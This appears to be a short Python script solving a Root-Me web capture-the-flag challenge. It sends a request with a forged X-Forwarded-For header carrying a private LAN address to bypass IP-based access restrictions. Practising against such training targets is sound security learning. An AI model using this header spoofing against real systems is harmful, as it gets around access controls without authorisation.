      
import requests

url = 'http://challenge01.root-me.org/web-serveur/ch68/' #  Replace with the actual challenge URL

headers = {
    'X-Forwarded-For': '192.168.1.100'  #  Remember,  pick an IP that looks like it's on their LAN
}

response = requests.get(url, headers=headers)

print(response.text)  # This will print the HTML content of the response

    
